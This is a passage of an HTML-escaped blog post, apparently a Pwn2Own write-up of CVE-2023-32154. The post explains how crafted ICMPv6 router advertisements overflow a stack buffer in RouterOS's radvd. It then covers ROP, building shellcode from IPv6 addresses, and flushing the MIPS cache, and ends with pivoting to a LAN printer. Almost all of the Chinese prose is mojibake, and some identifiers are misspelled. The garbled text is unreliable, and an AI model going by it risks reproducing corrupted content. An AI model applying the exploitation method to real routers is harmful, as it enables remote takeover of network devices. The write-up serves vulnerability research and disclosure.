&lt;img src=&quot;/assets/img/blog/20240524/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Â¶ÇÊûúÁôºÁèæÊúâÊî∂Âà∞Â∞ÅÂåÖÂ∞±ÊúÉÂëºÂè´Â∞çÊáâÁöÑ callback function ÂéªÈÄ≤Ë°åËôïÁêÜ
&lt;img src=&quot;/assets/img/blog/20240524/31.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÁöÑ callback ‰∏≠ÔºåÂÆÉÈ¶ñÂÖàÊ™¢Êü•Â∞ÅÂåÖÊòØÂê¶ÊòØÂêàÊ≥ïÁöÑ RA Êàñ RSÔºåÊòØ RA Â∞±ÊääË≥áË®äÂ≠òËµ∑‰æÜÔºõÊòØ RS Â∞±ÈñãÂßãÂæÄ LAN Âª£Êí≠ RA„ÄÇ&lt;/p&gt;

&lt;p&gt;ËÄåÁ∏ΩÂÖ±Êúâ‰∏âÁ®ÆÊÉÖÊ≥Å RouterOS ÊúÉÂæÄ LAN Âª£Êí≠ prefixÔºö&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Âæû LAN Êî∂Âà∞ RS Â∞ÅÂåÖ&lt;/li&gt;
  &lt;li&gt;Âæû WAN Êî∂Âà∞ RA Â∞ÅÂåÖ&lt;/li&gt;
  &lt;li&gt;ÂÆöÊôÇÂú® LAN Âª£Êí≠ RA Â∞ÅÂåÖÔºàÈ†êË®≠Èö®Ê©üÂú® 200~600 Áßí‰πãÂæåÂª£Êí≠‰∏ÄÊ¨°Ôºâ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‰∏çÈÅéÂú® callback ‰∏≠ÊàëÂÄëÊ≤íÊúâÈ¶¨‰∏äÈÄèÈÅéÈùúÊÖãÂàÜÊûêÊâæÂà∞ case 2 ÁôºÈÄÅ RA ÁöÑÂú∞ÊñπÔºåÁï∂ÊôÇÊàëÂÄëÈÇÑ‰∏çÁ¢∫ÂÆöÂÖ∑È´îÂéüÂõ†„ÄÇÂæå‰æÜÁôºÁèæÈÄôÈÉ®ÂàÜÁöÑË°åÁÇ∫Ëàá RouterOS IPC ‰∏≠ÁöÑË®ÇÈñ±Ê©üÂà∂ÊúâÈóúÔºåÊàëÂÄëÂ∞áÊúÉÂú®ÂæåÈù¢ÁöÑÁ´†ÁØÄÈÄ≤Ë°åËß£ÈáãÔºåÈÄôÂêåÊôÇ‰πüËàáÊàëÂÄëÁôºÁèæÁöÑ race condition Áõ∏Èóú„ÄÇ‰∏çÈÅéÂè¶Â§ñÂÖ©ÂÄãÊÉÖÊ≥ÅÊàëÂÄëÂà∞ÊòØÂèØ‰ª•Áõ¥Êé•ÈÄèÈÅéÈùúÊÖãÂàÜÊûêÊâæÂà∞„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú® case 1 ‰∏≠ÔºåÁï∂Âæû LAN Êî∂Âà∞ RS ÊôÇÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÊúÉÂëºÂè´ sendRA ‰æÜÂª£Êí≠ RA Â∞ÅÂåÖÔºö
&lt;img src=&quot;/assets/img/blog/20240524/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® case 2 ‰∏≠Ôºåhandler 1 Âú®ÂàùÂßãÂåñÂæå‰æøÊúÉÂéªË®ªÂÜä‰∏ÄÂÄã timerÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RAroutine&lt;/code&gt;Ôºö
&lt;img src=&quot;/assets/img/blog/20240524/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RAroutine&lt;/code&gt; Ë¢´Áî®‰æÜÂú®ÊØèÈöî‰∏ÄÊÆµÊôÇÈñìÂéªÂëºÂè´ sendRA ‰æÜÂª£Êí≠Â∞ÅÂåÖÔºö
&lt;img src=&quot;/assets/img/blog/20240524/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2023-32154&quot;&gt;CVE-2023-32154&lt;/h2&gt;

&lt;p&gt;ÂèØ‰ª•ÁôºÁèæÂÖ±ÂêåÁöÑÂáΩÂºèÂ∞±ÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt;ÔºåÂú®Ê∑±ÂÖ•ÂàÜÊûê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt; ‰πãÂæåÔºåÊàëÂÄëÁôºÁèæ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; Âú®ËôïÁêÜ DNS advisory ÁöÑÂú∞ÊñπÂ≠òÂú®Âº±Èªû„ÄÇ&lt;/p&gt;

&lt;p&gt;È¶ñÂÖàÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÊúÉÂ∞á upstream Êî∂Âà∞ÁöÑ RA ‰∏≠ÁöÑ DNS advisory ÂÑ≤Â≠òËµ∑‰æÜÔºà‰ΩøÁî® tree ‰ΩúÁÇ∫Ë≥áÊñôÁµêÊßãÔºâÔºåÁï∂ router Ë¶ÅÂæÄ LAN Âª£Êí≠ RA ÊôÇÔºåÈÄô‰∫õ DNS ‰πüÊúÉË¢´ÂåÖÈÄ≤ RA ‰∏≠‰∏ÄËµ∑Ë¢´Âª£Êí≠Áµ¶ LAN ÁöÑÊ©üÂô®„ÄÇÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ‰∏≠ÔºåÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; ÈÄôÂÄã function Â∞áÊ®πÁãÄÁµêÊßãÁöÑ DNS Â±ïÈñãÂæåÊîæÈÄ≤ ICMPv6 ÁöÑÂ∞ÅÂåÖÁï∂‰∏≠„ÄÇÁî®‰æÜÂÇ≥ÈÅûÁµ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; ÁöÑÁ¨¨‰∏ÄÂÄãÂèÉÊï∏ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RA_raw&lt;/code&gt; ÊòØ‰∏ÄÂÄã 4096 bytes ÁöÑ bufferÔºå‰πüÂ∞±ÊòØÊúÄÁµÇË¢´ÈÄÅÂá∫ÁöÑ ICMPv6„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ë∑üÈÄ≤ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; ÂæåÊàëÂÄëÈ¶¨‰∏äÂèØ‰ª•ÁôºÁèæÈÄôË£°ÂèØËÉΩÂ≠òÂú®‰∏ÄÂÄã stack buffer overflow ÁöÑÂº±ÈªûÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; ÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt; Êää DNS ÊîæÈÄ≤ ICMPv6 Â∞ÅÂåÖ‰∏≠ËÄå‰∏îÊ≤íÊúâ‰ªª‰Ωï boundary checkÔºåÂè™Ë¶Å DNS advisory Áµ¶ÁöÑÂ§†Â§öÂ∞±ÂèØ‰ª•Ëß∏Áôº stack buffer overflow„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôË£°‰ΩøÁî®ÁöÑ DNS ‰æÜËá™Êñº RA Â∞ÅÂåÖ‰∏≠ÁöÑ RDNSS Ê¨Ñ‰ΩçÔºå‰ΩÜÊ†πÊìö RFC ÂèØ‰ª•ÁôºÁèæÔºåÁî®‰æÜÊèèËø∞ RDNSS Èï∑Â∫¶ÁöÑÊ¨Ñ‰ΩçÂè™Êúâ 8-bitÔºåÊâÄ‰ª•ÊúÄÂ§öÂÉÖËÉΩË¶ÜËìã 255*16 bytesÔºåÈÄôÂÄãÈï∑Â∫¶‰∏¶ÁÑ°Ê≥ï‰ΩøÊàëÂÄëË¶ÜÂØ´Âà∞ return address„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰ΩÜÂ¶ÇÊûúÈÄô‰∏çÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; Á¨¨‰∏ÄÊ¨°Êî∂Âà∞ RAÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; Â∞±ÈúÄË¶ÅÂú®Êé•‰∏ã‰æÜÁöÑÂ∞ÅÂåÖ‰∏≠Â∞áËàäÁöÑ DNS Ê®ôÁÇ∫ expiredÔºåÊâÄ‰ª•ÂØ¶Èöõ‰∏äÊàëÂÄëÂèØ‰ª•Ë¶ÜËìãÂÖ©ÂÄçÁöÑÈï∑Â∫¶Ôºå‰πüÂ∞±ÊòØ 255*16*2 bytesÔºåÈÄôÂ∞±Ë∂≥‰ª•ËÆìÊàëÂÄëË¶ÜËìãÂà∞ return address ‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÊîªÊìäÊµÅÁ®ã&quot;&gt;ÊîªÊìäÊµÅÁ®ã&lt;/h2&gt;

&lt;p&gt;Êúâ‰∫Ü‰∏äËø∞ÁöÑÂº±ÈªûÔºåÊàëÂÄëÂè™Ë¶ÅÈÄèÈÅéÂæÄÁõÆÊ®ô RouterOS ÈÄÅÂÖ©ÂÄã RDNSS Ê¨Ñ‰ΩçÈï∑Â∫¶ÁÇ∫ 255 ÁöÑÊÉ°ÊÑè RA Â∞ÅÂåÖÔºåÂ∞±ÂèØ‰ª•Âà©Áî® RDNSS ‰∏≠ÁöÑ IPv6 Âú∞ÂùÄ‰æÜÊéßÂà∂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; Á®ãÂºèÁöÑÂü∑Ë°åÊµÅÁ®ã„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;‰øùË≠∑&quot;&gt;‰øùË≠∑&lt;/h3&gt;

&lt;p&gt;Áî±Êñº RouterOS ‰ΩøÁî® MIPS ÁöÑÊû∂ÊßãÔºåÊâÄ‰ª• CPU ‰∏¶‰∏çÊîØÊè¥ NX Ôºå‰ΩÜÈô§Ê≠§‰πãÂ§ñÁöÑ‰øùË≠∑‰πüÊ≤íÊúâË¢´ÈñãÂïü„ÄÇ
ÊâÄ‰ª•Âè™Ë¶ÅÊâæÂà∞Â•ΩÁî®ÁöÑ ROP gadget ËÆìÂü∑Ë°åÊµÅÁ®ãÊúÄÁµÇ jump Âà∞ÊàëÂÄëÊîæÂú® stack ‰∏äÁöÑ shellcode Â∞±Ë°å‰∫ÜÔºåËÅΩËµ∑‰æÜÊ•µÂ∫¶Á∞°ÂñÆ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;shellcode-ÈôêÂà∂&quot;&gt;shellcode ÈôêÂà∂&lt;/h3&gt;

&lt;p&gt;‰ΩÜÊòØÂú®ÊßãÈÄ† exploit ÁöÑÈÅéÁ®ã‰∏≠ÂÖ∂ÂØ¶Â≠òÂú®‰∏çÂ∞ëÈôêÂà∂Ôºå‰æãÂ¶ÇÔºåÂõ†ÁÇ∫ IPv6 Âú∞ÂùÄË¢´ÂÑ≤Â≠òÂú® tree ÁµêÊßã‰∏≠ÔºåÊâÄ‰ª•ÊúÉÂú®ÊéíÂ∫èÂæåÊâçÊîæ‰∏ä stackÔºåÂõ†Ê≠§ÊàëÂÄëÂøÖÈ†à‰øùË≠âÊàëÂÄëÂª∫ÊßãÁöÑ payload Âú®Á∂ìÈÅéÊéíÂ∫è‰πãÂæåÈÇÑÊúÉÊòØÊàëÂÄë‰∏ÄÈñãÂßãÊßãÈÄ†ÁöÑ shellcode„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊúÄÁ∞°ÂñÆÁöÑÊñπÊ≥ïÊòØÊää IPv6 ÁöÑ prefix Áï∂‰ΩúÊµÅÊ∞¥ËôüÔºåÈÄôÊ®£ÂèØ‰ª•‰øùË≠âÊàëÂÄëÊßãÈÄ†ÁöÑÂÖßÂÆπÁÖßÈ†ÜÂ∫èÊéíÂàóÔºåÊé•ËÄÖÂè™Ë¶ÅÈÄèÈÅé ROP gadget Ë∑≥Âà∞ÂæåÂçäÊÆµÁöÑ shellcode ‰∏äÈù¢Â∞±ÁÆóÂÆåÊàê‰∫Ü„ÄÇËÄåÂú®Êí∞ÂØ´ shellcode ÊôÇÔºåÊàëÂÄëÂè™Ë¶ÅÊääÊØèÂÄãÂú∞ÂùÄÁöÑ suffix ÈÉΩÊßãÈÄ†Êàê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; ÔºåÁî®‰æÜË∑≥ÈÅéÁÑ°Ê≥ïÂü∑Ë°åÁöÑÊµÅÊ∞¥ËôüÂç≥ÂèØ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰ΩÜÁî±Êñº MIPS Â≠òÂú® delay slot Ê©üÂà∂ÁöÑÈóú‰øÇÔºåCPU ÂØ¶Èöõ‰∏äÊúÉÂÖàÂéªÂü∑Ë°å &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; Êåá‰ª§ÁöÑÂæå‰∏ÄÊ¢ùÊåá‰ª§„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊâÄ‰ª•ÊàëÂÄëÂøÖÈ†àÊää &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; ÂæÄÂâçÁßªÂãïÊâçË°åÔºå‰ΩÜÁ∑äÊé•ËëóÁöÑÂïèÈ°å‰æøÊòØÔºöÂú® delay slot ‰∏≠‰∏çËÉΩ‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; ÈÄôÂÄãÊåá‰ª§„ÄÇÈÄôÁ®ÆÊÉÖÂ¢É‰∏ãÔºåpayload ÊßãÈÄ†Ëµ∑‰æÜÁõ∏Áï∂È∫ªÁÖ©‰πãÂ§ñÔºåÈÇÑÂèØËÉΩÊúÉË∂ÖÈÅéÊàëÂÄëÂèØ‰ª•‰ΩøÁî®ÁöÑÈï∑Â∫¶ÔºåÂõ†Ê≠§ÈÄôÂæû‰∏ÄÈñãÂßãÂ∞±ÊòØÂÄãÂ£û‰∏ªÊÑè„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÁÑ∂ËÄåÁúºÂ∞ñÁöÑÊúãÂèãËÇØÂÆöÂ∑≤Á∂ìÁôºÁèæ‰∫ÜÔºåÈÄôÂÖ∂ÂØ¶ÊòØ CTF ‰∏≠Â∏∏Ë¶ãÁöÑÂàùÂ≠∏Á≠âÁ¥öÈ°åÁõÆÔºåÂè™Ë¶ÅËÆì prefix ÊòØ‰∏ÄÂÄãÂêàÊ≥ï‰∏î‰∏çÂΩ±ÈüøÂü∑Ë°åÁµêÊûúÁöÑÊåá‰ª§Â∞±Â•Ω‰∫ÜÔºåÊàëÂÄëÊää prefix ÊîπÊàê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 2&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 3&lt;/code&gt;‚Ä¶‚Ä¶Ôºå‰ª•Ê≠§È°ûÊé®„ÄÇÈô§‰∫Ü payload ÊúÉÁÖßÊéíÂ∫èÊéíÂ•Ω‰πãÂ§ñÔºå‰πüÁØÄÁúÅ‰∫ÜÊú¨‰æÜÁî®‰æÜÊîæ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; Êåá‰ª§ÁöÑÁ©∫Èñì„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰ΩÜÊàëÂÄëÈÇÑÈúÄË¶ÅÁ®çÂæÆ‰øÆÊîπ‰∏Ä‰∏ã payload ÊâçË°åÔºåÂõ†ÁÇ∫ÊàëÂÄëÊ≤íÊúâ leak stack ‰ΩçÂùÄÁöÑÊºèÊ¥ûÔºåÂä†‰∏äÊàëÂÄëÊâæ‰∏çÂà∞‰ªª‰ΩïÂèØÁî®ÁöÑ gadget ‰æÜÊää stack ‰ΩçÂùÄÂæû &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$sp&lt;/code&gt; Êö´Â≠òÂô®Êê¨Âà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$t9&lt;/code&gt; Êö´Â≠òÂô®ÔºåÊâÄ‰ª•ÊàëÂÄëÈÄôË£°ÂÅöÁöÑ‰∫ãÊÉÖÊòØÔºöÈ¶ñÂÖàÔºåÈÄèÈÅé ROP gadget Êää &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jalr $sp&lt;/code&gt; Êåá‰ª§ÂØ´Âà∞‰∏ÄÂ°äË®òÊÜ∂È´î‰∏äÔºå‰πãÂæåÂÜçÁî®‰∏ÄÂÄã ROP gadget Ë∑≥‰∏äÂéªÂü∑Ë°åÂÆÉÔºåÈÄôÊ®£Â∞±ÂèØ‰ª•Â∞áÂü∑Ë°åÊµÅÁ®ãÂ∞éÂêëÊàëÂÄëÊßãÈÄ†ÁöÑ shellcodeÔºåËÅΩËµ∑‰æÜÊòØ‰∏ÄÁâáÂÖâÊòéÁöÑÊú™‰æÜÔºö
&lt;img src=&quot;/assets/img/blog/20240524/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰ΩÜÂÖâÊòØÈÄôÊ®£ÊòØÁÑ°Ê≥ïÈ†ÜÂà©Âü∑Ë°å shellcode ÁöÑÔºåÂõ†ÁÇ∫ MIPS ÈáùÂ∞çË®òÊÜ∂È´îÁöÑÂ≠òÂèñÊñπÂºèÊúâÂÖ©ÂÄã‰∏çÂêåÁöÑ cache„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;cache&quot;&gt;cache&lt;/h3&gt;

&lt;p&gt;MIPS ‰∏äÂ≠òÂú®ÂÖ©ÂÄã cacheÔºöI-cacheÔºàinstruction cacheÔºâ„ÄÅD-cacheÔºàdata cacheÔºâ„ÄÇ&lt;/p&gt;

&lt;p&gt;Áï∂ÊàëÂÄëÊää &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jslr $sp&lt;/code&gt; Êåá‰ª§ÂØ´‰∏äË®òÊÜ∂È´îÊôÇÔºåÂØ¶Èöõ‰∏äÊòØÂØ´Âà∞ D-cache ‰∏≠„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÁï∂ÊàëÂÄëÊé•ËëóÊääÂü∑Ë°åÊµÅÁ®ãÊéßÂà∂Âà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jslr $sp&lt;/code&gt; ÁöÑÂú∞ÂùÄÊôÇÔºåËôïÁêÜÂô®ÊúÉÂÖàÂéªÊ™¢Êü•ÈÄôÂÄãÂú∞ÂùÄÁöÑÊåá‰ª§ÊúâÊ≤íÊúâÂú® I-cache Áï∂‰∏≠ÔºåÂõ†ÁÇ∫Ë©≤‰ΩçÂùÄ‰ΩçÊñº data sectionÔºåÂú®Ê≠£Â∏∏Âü∑Ë°åÊµÅÁ®ã‰∏≠ËÇØÂÆöÊ≤íÊúâË¢´Âü∑Ë°åÈÅéÔºåÊâÄ‰ª• cache Ê∞∏ÈÅ†ÈÉΩÊúÉ missÔºåÂõ†Ê≠§ËôïÁêÜÂô®ÊúÉÊé•ËëóÂ∞á memory ÁöÑÂÖßÂÆπËºâÂÖ• I-cache Áï∂‰∏≠„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ê≠§ÊôÇÂõ†ÁÇ∫ D-cache ÁöÑÂÖßÂÆπÈÇÑÊ≤íÊúâË¢´Êõ¥Êñ∞Âà∞ memory ‰∏äÔºåI-cache Âè™ÊúÉÊäìÂà∞‰∏ÄÂ†Ü null bytesÔºå‰πüÂ∞±ÊòØ MIPS ‰∏äÁöÑ nopÔºåÊâÄ‰ª•Á®ãÂºèÂè™ÊúÉÂü∑Ë°å‰∏ÄÂ†ÜÊØ´ÁÑ°ÊÑèÁæ©ÁöÑ nop Áõ¥Âà∞ crash ÁÇ∫Ê≠¢„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®ÈÄôË£°ÊàëÂÄëÈúÄË¶Å‰ΩøËôïÁêÜÂô®Â∞á D-cache ÁöÑÂÖßÂÆπÂØ´Âõû memoryÔºåÊúâÂÖ©ÂÄãÊñπÊ≥ïÂèØ‰ª•ÂÅöÂà∞ÈÄô‰ª∂‰∫ãÊÉÖÔºöcontext switch ÊàñÊòØÁî®Áõ° D-cache ÊâÄÊúâÁ©∫ÈñìÔºà32 KBÔºâ„ÄÇËß∏Áôº context switch ÊòØÊØîËºÉÁ∞°ÂñÆÁöÑÂÅöÊ≥ïÔºå‰ΩÜÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ‰∏≠‰∏¶Ê≤íÊúâ‰ªª‰Ωï &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sleep&lt;/code&gt; ËÆìÊàëÂÄëÁî®‰æÜËß∏Áôº context switchÔºåÂÖ∂‰ªñ function ÈõñÁÑ∂‰πüÊúÉÈô∑ÈÄ≤ kernelÔºå‰ΩÜ context switch ÁôºÁîüÁöÑÊ©üÁéá‰∏¶‰∏çÈ´òÔºåÁÇ∫‰∫ÜËßíÈÄê Pwn2Own ÂÜ†ËªçÔºåËÆìÊîªÊìäÈÅîÂà∞Ë∂®Ëøë 100% ÊàêÂäüÁöÑÁ©©ÂÆöÂ∫¶ÊòØÂøÖÈ†àÁöÑÔºåÂõ†Ê≠§ÊàëÂÄëËΩâËÄåÂ∞ãÊâæËÄóÁõ° D-cache ÁöÑ 32kb ÂÆπÈáèÁöÑÊñπÊ≥ï„ÄÇ&lt;/p&gt;

&lt;p&gt;È¶ñÂÖàÔºåÈÄèÈÅéÁ∞°ÂñÆÁöÑÊ™¢Êü•ÂèØ‰ª•ÁôºÁèæ RouterOS ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radomize_va_space&lt;/code&gt; ËÆäÊï∏ÊòØ 1ÔºåË°®Á§∫ heap ÁöÑË®òÊÜ∂È´î‰ΩçÂùÄ‰∏çÊòØÈö®Ê©üÁöÑÔºåÂõ†Ê≠§‰∏çÈúÄË¶Å leak Â∞±ÂèØ‰ª•Áü•ÈÅì heap ÊâÄÂú®‰ΩçÂùÄÔºåÊâÄ‰ª•ÊàëÂÄëÂè™Ë¶ÅÊé•ËëóÊÉ≥Ëæ¶Ê≥ïËÆì heap ÂàÜÈÖçË∂≥Â§†Â§ßÁöÑÁ©∫ÈñìÔºåÁÑ∂ÂæåÂØ´‰∏Ä‰∫õÁÑ°ÈóúÁ∑äË¶ÅÁöÑÊù±Ë•ø‰∏äÂéªÂ∞±ÂèØ‰ª•ËÄóÁõ° 32kb ÁöÑ D-cache ‰∫ÜÔºÅ‰∏çÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ‰∏≠‰∏¶Ê≤íÊúâÂ§™Â§öÂ•ΩÁî®ÁöÑ ROP gadgetÔºåÊâÄ‰ª•Ë¶ÅÊßãÈÄ†ÈÄôÊ®£ÁöÑ payload ÈúÄË¶Å‰∏≤ÈÄ£Êõ¥Â§ö ROP gadget ÊâçËÉΩÈÅîÂà∞ÂêåÊ®£ÁöÑÁõÆÁöÑÔºåÊúÄÁµÇ payload Èï∑Â∫¶ÂèØËÉΩÊúÉË∂ÖÈÅéÊàëÂÄëÂèØ‰ª•Ë¶ÜËìãÁöÑÈï∑Â∫¶„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âπ∏ÈÅãÁöÑÊòØÂ¶ÇÂêåÂâçÈù¢ÊâÄË™™ÔºåDNS Ë¢´Â≠òÊîæÂú® tree ÁµêÊßã‰∏≠ÔºåÊâÄ‰ª•ÂÑ≤Â≠òÊôÇÂ∞±Â∑≤Á∂ìÂú® heap ‰∏≠‰ΩîÊìö‰∏ÄÂ§ßÂ°äË®òÊÜ∂È´îÔºåÈÄèÈÅé gdb ÈÄêÊ≠•Âü∑Ë°åÔºåÊàëÂÄëÂèØ‰ª•Á¢∫ÂÆöÂú®ËôïÁêÜ DNS ÊôÇÔºåheap ÁöÑÁ©∫ÈñìÂ∑≤Á∂ìÊØî 32kb ÈÇÑË¶ÅÂ§ßÔºÅÂõ†Ê≠§ÊàëÂÄëÂè™Ë¶ÅÊé•ËëóÈÄèÈÅé GOT hijack ÂëºÂè´ memcpy ÂæÄ heap ÂØ´ 32kb ÁöÑÂûÉÂúæÂ∞±ÂèØ‰ª•‰∫ÜÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåÊàëÂÄëÁöÑ exploit Â∞±ÂÆåÊàê‰∫ÜÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÁµêÂêàÊàëÂÄëÂè¶Â§ñ‰∏ÄÂÄãÁÇ∫‰∫Ü Pwn2Own ÊâæÁöÑ Canon printer Âº±ÈªûÔºåÊîªÊìäÊµÅÁ®ãÊúÉÊòØ&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ÊîªÊìäËÄÖ‰ΩúÁÇ∫ router ÁöÑÂ£ûÈÑ∞Â±ÖÔºåÂ∞çÂÆÉÁôºÈÄÅÊÉ°ÊÑèÁöÑ ICMPv6 Â∞ÅÂåÖ&lt;/li&gt;
  &lt;li&gt;Âú®ÊàêÂäüÊéßÂà∂ router ÂæåÔºåÊàëÂÄëÈÄ≤Ë°å port forwardingÔºåÊää payload Â∞éÂêëÂú® LAN ÁöÑ Canon Âç∞Ë°®Ê©ü„ÄÇ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® Pwn2Own ÁöÑÊØîË≥ΩÁí∞Â¢É‰∏≠ÔºåÁ∂≤Ë∑ØÁí∞Â¢ÉÂèØ‰ª•Ë¢´Á∞°ÂåñÂæóÊõ¥Á∞°ÂñÆ‰∏ÄÈªûÔºåÂ¶Ç‰∏ãÔºö
&lt;img src=&quot;/assets/img/blog/20240524/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploit-Èô§ÈåØÈÅéÁ®ã&quot;&gt;Exploit Èô§ÈåØÈÅéÁ®ã&lt;/h2&gt;

